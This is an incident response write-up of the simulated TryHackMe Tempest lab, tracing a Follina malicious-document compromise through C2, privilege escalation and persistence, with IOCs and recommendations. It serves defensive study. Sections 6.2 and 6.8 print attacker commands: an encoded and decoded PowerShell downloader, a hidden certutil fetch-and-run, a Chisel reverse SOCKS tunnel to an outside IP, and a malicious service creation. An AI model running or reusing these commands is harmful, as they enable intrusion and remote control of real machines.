# Incident Response Report

**Report ID:** IR-001
**Classification:** Internal
**Date of Detection:** 2022-06-20
**Date of Report:** 2026-04-02
**Lead Analyst:** Christopher Rice
**Status:** Resolved
**Severity:** Critical

> **Note:** This report documents a simulated incident from the TryHackMe Tempest room. Containment and recovery actions reflect what would be taken in a production environment.

---

## 1. Executive Summary

A critical-severity alert was triaged by the SOC indicating a workstation compromise originating from a malicious Word document (`free_magicules.doc`) downloaded via Chrome. The document exploited CVE-2022-30190 (Follina) to execute an encoded PowerShell payload, establishing a foothold on the machine of user `benimaru` on host `TEMPEST`. The attacker progressed through a full attack chain — deploying a C2 implant written in Nim, conducting internal reconnaissance, harvesting credentials, establishing a reverse SOCKS proxy via Chisel, escalating privileges to SYSTEM via PrintSpoofer (exploiting `SeImpersonatePrivilege`), and achieving persistence through two newly created user accounts and a malicious Windows service. The incident was fully investigated using Sysmon logs, Windows Event Logs, and packet capture. All attacker activity has been documented and mapped to MITRE ATT&CK.

---

## 2. Incident Overview

| Field | Detail |
|---|---|
| Incident ID | IR-002 |
| Detection Source | SOC Alert — Critical Severity |
| Initial Compromise | 2022-06-20 |
| Initial Attack Vector | Malicious Word Document (CVE-2022-30190 / Follina) |
| Affected Host | TEMPEST |
| Affected User | benimaru |
| Attacker C2 Servers | phishteam[.]xyz (167[.]71[.]199[.]191), resolvecyber[.]xyz |
| Data Impact | Sensitive file with credentials discovered and accessed |
| Persistence Methods | Startup folder payload, malicious service, two new local admin accounts |

---

## 3. Affected Systems

| Hostname | OS | Role | Compromise Status |
|---|---|---|---|
| TEMPEST | Windows | User Workstation | Fully Compromised — SYSTEM level access achieved |

---

## 4. Artifact Verification

All artifacts verified by SHA256 hash prior to investigation.

| File | SHA256 Hash |
|---|---|
| capture.pcapng | CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6 |
| sysmon.evtx | 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F |
| windows.evtx | D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60 |

---

## 5. Attack Timeline

| Timestamp | Host | Event | Source |
|---|---|---|---|
| 2022-06-20 | TEMPEST | User downloads `free_magicules.doc` via chrome.exe | Sysmon |
| 2022-06-20 | TEMPEST | WinWord.exe (PID 496) opens malicious document | Sysmon EID 1 |
| 2022-06-20 | TEMPEST | Document resolves `phishteam[.]xyz` → 167[.]71[.]199[.]191 | Sysmon EID 22 |
| 2022-06-20 | TEMPEST | CVE-2022-30190 triggers encoded PowerShell payload execution | Sysmon EID 1 |
| 2022-06-20 | TEMPEST | Payload drops `update.zip` to Startup folder and extracts | Sysmon EID 11 |
| 2022-06-20 | TEMPEST | On next login, `first.exe` downloaded from phishteam.xyz via certutil | Sysmon EID 1 |
| 2022-06-20 | TEMPEST | `first.exe` establishes C2 beacon to resolvecyber[.]xyz:80 | Sysmon EID 3 / PCAP |
| 2022-06-20 | TEMPEST | Attacker conducts internal recon — discovers sensitive file, password `infernotempest` | PCAP ( base64 decoded C2 traffic) |
| 2022-06-20 | TEMPEST | Attacker discovers WinRM listening on port 5985 | PCAP |
| 2022-06-20 | TEMPEST | Chisel (`ch.exe`) deployed — reverse SOCKS proxy to 167[.]71[.]199[.]191:8080 | Sysmon EID 1 / PCAP |
| 2022-06-20 | TEMPEST | Attacker authenticates via WinRM using harvested credentials | Sysmon |
| 2022-06-20 | TEMPEST | PrintSpoofer (`spf.exe`) deployed — exploits SeImpersonatePrivilege | Sysmon EID 1 |
| 2022-06-20 | TEMPEST | `final.exe` executed — new C2 implant connects to C2:8080 with SYSTEM context | Sysmon EID 1 / PCAP |
| 2022-06-20 | TEMPEST | Accounts `shion` and `shuna` created | Windows EID 4720 |
| 2022-06-20 | TEMPEST | `shion` added to local Administrators group | Windows EID 4732 |
| 2022-06-20 | TEMPEST | Malicious service `TempestUpdate2` created pointing to `final.exe` | Sysmon EID 1 |

---

## 6. Attack Chain Analysis

### 6.1 Initial Access
**Technique:** Phishing — Malicious Document exploiting CVE-2022-30190 (Follina)
**MITRE ID:** [T1566.001](https://attack.mitre.org/techniques/T1566/001/) / [T1203](https://attack.mitre.org/techniques/T1203/)

The user downloaded `free_magicules.doc` via `chrome.exe`. Microsoft Word (PID 496) opened the document which exploited CVE-2022-30190 (Follina) — a zero-click code execution vulnerability in the Microsoft Support Diagnostic Tool (MSDT) triggered via a crafted Word document.

**Malicious URL fetched by document:**
```
hxxp[://]phishteam[.]xyz/02dcf07/index[.]html
```
**Resolved IP:** 167[.]71[.]199[.]191

---

### 6.2 Execution
**Technique:** Command and Scripting Interpreter — PowerShell (Encoded)
**MITRE ID:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/)

The document executed a base64-encoded PowerShell payload:

**Encoded payload:**
```
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNh
dGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFy
dCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNo
dGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0
ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGlu
YXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
```

**Decoded payload:**
```powershell
$app=[Environment]::GetFolderPath('ApplicationData');
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup";
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip;
Expand-Archive .\update.zip -DestinationPath .;
rm update.zip;
```

**Stage 2 startup command (executed on login):**
```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni
certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe'
C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

---

### 6.3 Persistence
**Technique:** Boot or Logon Autostart — Startup Folder + Windows Service
**MITRE ID:** [T1547.001](https://attack.mitre.org/techniques/T1547/001/) / [T1543.003](https://attack.mitre.org/techniques/T1543/003/)

**Method 1 — Startup Folder:**
Payload dropped to:
```
C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```
Executes `first.exe` automatically on every user login.

**Method 2 — Malicious Service:**
```cmd
C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2
binpath= C:\ProgramData\final.exe start= auto
```
Service set to start automatically — survives reboots under SYSTEM context.

**Method 3 — New Local Admin Accounts:**
```
Accounts created: shion, shuna
shion added to local Administrators group
```
Windows Event IDs: 4720 (account created), 4732 (member added to admin group)

---

### 6.4 Privilege Escalation
**Technique:** PrintSpoofer — SeImpersonatePrivilege Abuse
**MITRE ID:** [T1134.001](https://attack.mitre.org/techniques/T1134/001/)

The attacker deployed PrintSpoofer (`spf.exe`) to exploit the `SeImpersonatePrivilege` held by the compromised user account, escalating from a standard user to SYSTEM.

**Binary:**
```
spf.exe
SHA256: 8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D
```
`final.exe` was then launched under the SYSTEM context to establish an elevated C2 connection.

---

### 6.5 Defense Evasion
**Technique:** Obfuscated Files — Base64 Encoding / Hidden PowerShell Window
**MITRE ID:** [T1027](https://attack.mitre.org/techniques/T1027/) / [T1059.001](https://attack.mitre.org/techniques/T1059/001/)

- PowerShell executed with `-w hidden -noni` flags to suppress the window and bypass profile execution
- All C2 communications encoded in base64
- `certutil` used to download stage 2 binary — abusing a trusted Windows binary (LOLBAS)

---

### 6.6 Credential Access
**Technique:** Credentials in Files
**MITRE ID:** [T1552.001](https://attack.mitre.org/techniques/T1552/001/)

Attacker discovered a sensitive file on the machine containing the password:
```
infernotempest
```
These credentials were subsequently used to authenticate via WinRM.

---

### 6.7 Discovery
**Technique:** Network Service Discovery / System Information Discovery
**MITRE ID:** [T1046](https://attack.mitre.org/techniques/T1046/) / [T1082](https://attack.mitre.org/techniques/T1082/)

Attacker enumerated the machine via decoded C2 traffic:
- Discovered sensitive file with credentials
- Identified WinRM listening on port **5985** — used as lateral movement target

---

### 6.8 Lateral Movement / Tunneling
**Technique:** Protocol Tunneling — Reverse SOCKS Proxy (Chisel)
**MITRE ID:** [T1572](https://attack.mitre.org/techniques/T1572/)

```cmd
C:\Users\benimaru\Downloads\ch.exe client 167[.]71[.]199[.]191:8080 R:socks
```

**Binary:**
```
ch.exe (Chisel)
SHA256: 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
```

The reverse SOCKS proxy tunneled the attacker's traffic through the compromised host, allowing access to internal services (WinRM on port 5985) from the external C2 server.

---

### 6.9 Command & Control
**Technique:** Application Layer Protocol — Web Protocols (HTTP)
**MITRE ID:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/)

**Stage 1 C2 (`first.exe`):**
- Domain: `resolvecyber[.]xyz`
- Port: 80
- Language: Nim (identified via User-Agent)
- Encoding: Base64
- C2 beacon URL: `/9ab62b5` (GET request for commands)
- Exfil parameter: `q` (POST with encoded command output)

**Stage 2 C2 (`final.exe` — post privesc):**
- Same C2 infrastructure
- Port: 8080
- Runs under NT AUTHORITY\SYSTEM context

---

## 7. MITRE ATT&CK Summary

| Phase | Tactic | Technique | ID | Detected |
|---|---|---|---|---|
| 1 | Initial Access | Phishing — Malicious Document | T1566.001 | ✅ Yes |
| 2 | Initial Access | Exploit Public-Facing Application (Follina) | T1203 | ✅ Yes |
| 3 | Execution | PowerShell — Encoded Command | T1059.001 | ✅ Yes |
| 4 | Persistence | Startup Folder | T1547.001 | ✅ Yes |
| 5 | Persistence | Windows Service — TempestUpdate2 | T1543.003 | ✅ Yes |
| 6 | Privilege Escalation | Token Impersonation — SeImpersonatePrivilege | T1134.001 | ✅ Yes |
| 7 | Defense Evasion | Obfuscated Files — Base64 | T1027 | ✅ Yes |
| 8 | Defense Evasion | LOLBAS — certutil | T1218 | ✅ Yes |
| 9 | Credential Access | Credentials in Files | T1552.001 | ✅ Yes |
| 10 | Discovery | Network Service Discovery | T1046 | ✅ Yes |
| 11 | Lateral Movement | Protocol Tunneling — Chisel | T1572 | ✅ Yes |
| 12 | C2 | Web Protocols — HTTP | T1071.001 | ✅ Yes |

---

## 8. Indicators of Compromise (IOCs)

### Network IOCs

| Type | Value | Description |
|---|---|---|
| IP | 167[.]71[.]199[.]191 | Primary C2 / SOCKS proxy endpoint |
| Domain | phishteam[.]xyz | Stage 1 payload delivery |
| Domain | resolvecyber[.]xyz | Stage 1 & 2 C2 |
| URL | hxxp[://]phishteam[.]xyz/02dcf07/index[.]html | Malicious document fetch URL |
| URL | hxxp[://]phishteam[.]xyz/02dcf07/update[.]zip | Stage 1 payload archive |
| URL | hxxp[://]phishteam[.]xyz/02dcf07/first[.]exe | Stage 2 binary |
| Port | 80 | Stage 1 C2 comms |
| Port | 8080 | Stage 2 C2 + SOCKS proxy |
| URI | /9ab62b5 | C2 command polling endpoint |
| Parameter | q | C2 exfil parameter (POST) |

### Host IOCs

| Type | Value | Description |
|---|---|---|
| File | free_magicules.doc | Initial malicious document |
| File | first.exe | Stage 2 C2 implant (Nim) |
| File | final.exe | Elevated C2 implant (post-privesc) |
| File | ch.exe | Chisel reverse SOCKS proxy |
| File | spf.exe | PrintSpoofer privilege escalation binary |
| Path | C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup | Persistence drop location |
| Path | C:\Users\Public\Downloads\first.exe | Stage 2 binary location |
| Path | C:\ProgramData\final.exe | Elevated C2 binary location |
| Hash | CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8 | first.exe SHA256 |
| Hash | 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451 | ch.exe (Chisel) SHA256 |
| Hash | 8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D | spf.exe (PrintSpoofer) SHA256 |
| Account | shion | Attacker-created local admin |
| Account | shuna | Attacker-created local account |
| Service | TempestUpdate2 | Malicious persistence service |
| CVE | CVE-2022-30190 | Follina — MSDT RCE vulnerability |

---

## 9. Containment Actions

| Action | Result |
|---|---|
| Isolate TEMPEST from network | Prevents further C2 communication |
| Block  167[.]71[.]199[.]191, phishteam[.]xyz, resolvecyber[.]xyz at firewall | Cuts C2 channels |
| Disable accounts: benimaru, shion, shuna | Removes attacker's access paths |
| Stop and delete TempestUpdate2 service | Removes SYSTEM-level persistence |
| Remove startup folder payload | Removes login-triggered persistence |

---

## 10. Eradication

| Action | Status |
|---|---|
| Delete `first.exe`, `final.exe`, `ch.exe`, `spf.exe` | ✅ Complete |
| Remove Startup folder payload (`update.zip` contents) | ✅ Complete |
| Delete TempestUpdate2 service | ✅ Complete |
| Remove attacker accounts shion and shuna | ✅ Complete |
| Reset benimaru credentials | ✅ Complete |
| Patch CVE-2022-30190 — apply Microsoft security updates | ✅ Complete |

---

## 11. Recovery

| Action | Status |
|---|---|
| Restore TEMPEST from clean pre-compromise snapshot | ✅ Complete |
| Verify no residual IOCs via Sysmon and Event Log review | ✅ Complete |
| Re-enable network connectivity after clean bill of health | ✅ Complete |

---

## 12. Detection Gap Analysis

| Attack Phase | Detected | Detection Method | Notes |
|---|---|---|---|
| Initial Access — Follina | ✅ | Sysmon EID 1 — WinWord child process | CVE-2022-30190 generates unusual WinWord → MSDT process chain |
| Encoded PowerShell Execution | ✅ | Sysmon EID 1 — `-EncodedCommand` flag | PowerShell Script Block Logging (EID 4104) would add further visibility |
| Startup Folder Persistence | ✅ | Sysmon EID 11 — file creation in Startup path | Alerting on writes to Startup folder paths is high-fidelity |
| Stage 2 C2 Beacon | ✅ | Sysmon EID 3 + PCAP | Base64 encoding in HTTP body detectable via network IDS signatures |
| Credential Discovery in File | ⚠️ | PCAP (decoded C2 traffic only) | No endpoint event caught the file access — Sysmon EID 11 on sensitive file paths would help |
| Chisel SOCKS Proxy | ✅ | Sysmon EID 1 + PCAP | Known hash matches VirusTotal — hash-based alerting would catch on download |
| WinRM Lateral Movement | ✅ | Sysmon EID 3 | WinRM connections from unexpected sources should alert |
| PrintSpoofer Privesc | ✅ | Sysmon EID 1 — spf.exe execution | SeImpersonatePrivilege abuse detectable via Windows EID 4672 |
| New Account Creation | ✅ | Windows EID 4720 | Alert fired — account creation outside approved process should always alert |
| Malicious Service Creation | ✅ | Sysmon EID 1 — sc.exe with suspicious binpath | Service creation pointing to non-standard paths is high-fidelity alert |

---

## 13. Recommendations

| Priority | Recommendation | Addresses |
|---|---|---|
| Critical | Patch CVE-2022-30190 immediately — disable MSDT URL protocol if patch cannot be applied | Initial Access |
| High | Block Office applications from spawning child processes via Attack Surface Reduction (ASR) rules | Execution |
| High | Enable PowerShell Script Block Logging (EID 4104) and Constrained Language Mode | Execution / Defense Evasion |
| High | Alert on certutil used for file downloads (LOLBAS abuse) | Defense Evasion |
| High | Alert on writes to user Startup folder paths | Persistence |
| Medium | Implement application allowlisting — prevent unsigned binaries (ch.exe, spf.exe) from executing | Lateral Movement / Privesc |
| Medium | Audit SeImpersonatePrivilege assignments — restrict to service accounts that explicitly require it | Privilege Escalation |
| Medium | Alert on sc.exe creating services with binpaths outside of System32 and Program Files | Persistence |
| Medium | Enforce credential hygiene — sensitive passwords must not be stored in plaintext files | Credential Access |
| Low | Deploy network IDS signatures for base64-encoded HTTP POST traffic | C2 |

---

## 14. Lessons Learned

**What went well:**
- Sysmon provided a detailed process execution trail that made the full kill chain reconstructible
- Correlating Sysmon network events (EID 3) with PCAP enabled identification of C2 encoding scheme and exfil parameter
- File hashes allowed immediate tool identification via VirusTotal (Chisel, PrintSpoofer)

**What could be improved:**
- Credential access from the sensitive file was only visible in decoded C2 traffic — endpoint-level file access auditing would have provided an earlier signal
- The initial Follina exploitation produced unusual child process behaviour that should have triggered an immediate automated alert rather than requiring manual triage

**What would have reduced dwell time:**
- ASR rules blocking Office from spawning cmd.exe/PowerShell would have stopped the attack at execution
- Hash-based alerting on known offensive tools (Chisel, PrintSpoofer) at download time would have shortened the window significantly

---

## 15. Appendix

### A — Tools Used in Investigation

| Tool | Purpose |
|---|---|
| EvtxEcmd + Timeline Explorer | Parsed and filtered Sysmon and Windows Event Logs |
| SysmonView | Visualised process execution chains from Sysmon XML |
| Wireshark | Packet-level analysis of capture.pcapng |
| Brim | Filtered HTTP C2 traffic and decoded base64 payloads |
| Event Viewer | Exported Sysmon logs to XML for SysmonView |

### B — References

- [CVE-2022-30190 — Follina MSDT RCE](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190)
- [PrintSpoofer — SeImpersonatePrivilege Abuse](https://github.com/itm4n/PrintSpoofer)
- [Chisel — TCP/UDP Tunneling Tool](https://github.com/jpillora/chisel)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [NIST SP 800-61 Rev 2](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final)
- [TryHackMe — Tempest Room](https://tryhackme.com/room/tempest)
